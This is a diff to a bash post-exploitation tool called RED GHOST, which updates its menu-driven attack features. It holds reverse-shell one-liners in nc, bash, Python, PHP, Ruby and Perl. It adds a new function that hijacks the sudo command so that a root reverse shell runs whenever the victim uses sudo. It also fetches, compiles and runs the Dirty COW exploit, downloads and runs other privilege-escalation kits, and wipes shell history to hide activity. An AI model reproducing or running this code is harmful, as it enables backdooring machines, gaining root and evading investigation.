@@ -5,6 +5,17 @@ trap "rm $OUTPUT; rm $INPUT; exit" SIGHUP SIGINT SIGTERM
 declare -A dispatch_table
 declare -a options
 
+payloads=(
+
+"nc -e /bin/bash address prt"
+"bash -i >& /dev/tcp/address/prt 0>&1"
+"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"address\",prt));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+"php -r '\$sock=fsockopen(\"address\",prt);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+"ruby -rsocket -e 'f=TCPSocket.open(\"address\",prt).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+"perl -e 'use Socket;\$i=\"address\";\$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+
+)
+
 function display_output(){
 		local h=${1-10}
 		local w=${2-41}
@@ -24,17 +35,6 @@ function prompt(){
 	        done
 }
 
-
-payloads=(
-
-"nc -e /bin/bash address prt"
-"bash -i >& /dev/tcp/address/prt 0>&1"
-"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"address\",prt));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
-"php -r '\$sock=fsockopen(\"address\",prt);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
-"ruby -rsocket -e 'f=TCPSocket.open(\"address\",prt).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
-"perl -e 'use Socket;\$i=\"address\";\$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
-
-)
 
 function encshell(){
 		echo -e "Enter listener server address and port\n"
@@ -56,8 +56,6 @@ function genpayload(){
 				echo -e "Payload saved as `pwd`/.shell.sh"
 				read -p "Press enter to continue "
 		}
-
-
 		options=( "Reverse Netcat Shell" "Reverse Bash Shell" "Reverse Python Shell" "Reverse PHP Shell" "Reverse Ruby Shell" "Reverse Perl Shell"  "Return to main menu")
 		dispatch_table=(
 			["Reverse Netcat Shell"]=create
@@ -72,10 +70,49 @@ function genpayload(){
 }
 
 
+function sudowrap(){
+			cat <<-EOF
+
+				-- sudo command injection wrapper --
+
+				*******
+				WARNING
+				*******
+				This function wraps this system's sudo command with a function that runs a root netcat reverse shell when 'sudo' is run in terminal
+				for privilege escalation. (If this user is added to /etc/sudoers)
+ 
+				Wait for your target to log in and run sudo and you will receive a reverse root shell.
+
+				EOF
+			read -p "enter (continue/exit) or press enter to return to menu: " ce
+			case $ce in
+				[CONTINUEcontinue]* )
+					shell=${payloads[0]}
+					echo -e "Enter listener server address and port\n"
+					read -r -p "Address: " address
+					read -r -p "Port: " port
+					shell="${shell/'address'/$address}"
+					shell="${shell/'prt'/$port}"
+					echo -e "function sudo(){ \n(sudo ${shell} > /dev/null 2>.1 &)\n /usr/bin/sudo \$1 \$2 \$3 \$4 \$5 \$6 \$7 \$8 \$9 \n}" > $HOME/.sudo
+					echo "source ~/.sudo" >> ~/.bashrc
+					echo -e "\nsudo injection complete!\n\nTo effect changes for this terminal session enter 'source ~/.bashrc' in terminal\n"
+					read -p "Press enter to continue ";;
+			[Exitexit]* ) return;;
+			esac
+}
+
+
 function lswrap(){
-		echo -e "--ls payload wrapper--\n"
-		echo -e "*****WARNING*****"
-		echo -e "This function wraps this systems ls command with a function that runs a netcat reverse shell when ls is run in terminal\n"
+		cat <<-EOF
+
+				--ls command payload injection wrapper--
+
+				*******
+				WARNING
+				*******
+				This function wraps this systems ls command with a function that runs a netcat reverse shell when ls is run in terminal
+
+				EOF
 		read -p "enter (continue/exit) or press enter to return to menu: " ce	
 		case $ce in
 			[CONTINUEcontinue]* )
@@ -168,38 +205,53 @@ function escalate(){
 
 		function dirty(){
 				echo -e "This may take some time...\n"
-				wget https://raw.githubusercontent.com/d4rk007/dirtycow/master/dirty.c 2>/dev/null
-				gcc -pthread dirty.c -o dirty -lcrypt
-				./dirty
-				rm -rf dirty*
+				wget -P $HOME https://raw.githubusercontent.com/d4rk007/dirtycow/master/dirty.c 2>/dev/null
+				gcc -pthread $HOME/dirty.c -o $HOME/dirty -lcrypt
+				$HOME/./dirty
+				rm -rf $HOME/dirty*
 				read -p "Press Enter to continue"
 		}
 
 
 		function linprivesc(){
-				wget https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py 2>/dev/null
-				python linuxprivchecker.py
-				rm linuxprivchecker.py
+				wget -P $HOME https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py 2>/dev/null
+				python $HOME/./linuxprivchecker.py
+				rm $HOME/linuxprivchecker.py
 				read -p "Press Enter to continue"
 		
 		}
 
 
 		function exploitsug(){
-				wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh 2>/dev/null
-				chmod +x les.sh; ./les.sh; rm les.sh
+				wget -P $HOME https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh 2>/dev/null
+				chmod +x $HOME/les.sh; $HOME/./les.sh; rm $HOME/les.sh
 				read -p "Press Enter to continue"
 		}
 
 
 		function lineum(){
-				wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh 2>/dev/null
-				chmod +x LinEnum.sh; ./LinEnum.sh; rm LinEnum.sh
+				wget -P $HOME https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh 2>/dev/null
+				chmod +x $HOME/LinEnum.sh; $HOME/./LinEnum.sh; rm $HOME/LinEnum.sh
 				read -p "Press Enter to continue"
+		}
+		
+		function Orc(){
+		
+			wget -P $HOME https://github.com/zMarch/Orc/archive/master.zip 2>/dev/null
+			unzip -q $HOME/master.zip -d $HOME/Orc
+			cat <<-EOF
+			"Dropping into Orc shell!"
+
+			Check https://github.com/zMarch/Orc for commands and usage.
+
+			EOF
+			ENV=$HOME/Orc/Orc-master/o.rc sh -i
+			rm -rf $HOME/Orc
+		
 		}
 
 
-		options=( "Try conventional methods to escalate privileges" "Search for password in this system" "Download and run dirty cow exploit" "Download and run linuxprivchecker.py" "Download and run linux exploit suggester" "Download and run LinEnum" "Return to main menu")
+		options=( "Try conventional methods to escalate privileges" "Search for password in this system" "Download and run dirty cow exploit" "Download and run linuxprivchecker.py" "Download and run linux exploit suggester" "Download and run LinEnum" "Download and run Orc" "Return to main menu")
 		dispatch_table=(
 			["Try conventional methods to escalate privileges"]=conmethods
 			["Search for password in this system"]=search
@@ -207,6 +259,7 @@ function escalate(){
 			["Download and run linuxprivchecker.py"]=linprivesc
 			["Download and run linux exploit suggester"]=exploitsug
 			["Download and run LinEnum"]=lineum
+			["Download and run Orc"]=Orc
 			["Return to main menu"]=return
 		)
 		prompt "How would you like to get root?" options dispatch_table
@@ -214,10 +267,9 @@ function escalate(){
 
 
 function clearlog(){
-		rm -rf /var/log/*
 		export HISTFILE=
 		unset HISTFILE
-		rm -rf ~/.bash_history && ln -s ~/.bash_history /dev/null
+		rm -rf ~/.bash_history
 		touch ~/.bash_history
 		unset HISTFILE HISTSIZE
 		set history=0
@@ -316,11 +368,12 @@ function banip(){
 while true
 do
 
-dialog --clear --nocancel --backtitle "Coded by d4rkst4t1c.." \
+dialog --clear --nocancel --backtitle "Coded by d4rkst4t1c.. v2.0" \
 --title "[ R E D G H O S T - P O S T  E X P L O I T - T O O L ]" \
---menu "Linux post exploitation framework and payload generator." 15 60 8 \
+--menu "Linux post exploitation framework and payload generator." 18 60 9 \
 Payloads "Generate Reverse Shells" \
-lsWrapper "Inject 'ls' command with payload" \
+SudoInject "Inject 'sudo' to run payload as root" \
+lsInject "Inject 'ls' with payload" \
 Crontab "Add cron job for persistence" \
 GetRoot "Escalate privileges" \
 Clearlogs "Clear all logs" \
@@ -332,7 +385,8 @@ menuitem=$(<"${INPUT}")
 
 case $menuitem in
 	Payloads) clear; genpayload;;
-	lsWrapper) clear; lswrap;;
+	SudoInject) clear; sudowrap;;
+	lsInject) clear; lswrap;;
 	Crontab) clear; cron;;
 	GetRoot) clear; escalate;; 
 	Clearlogs) clear; clearlog;;
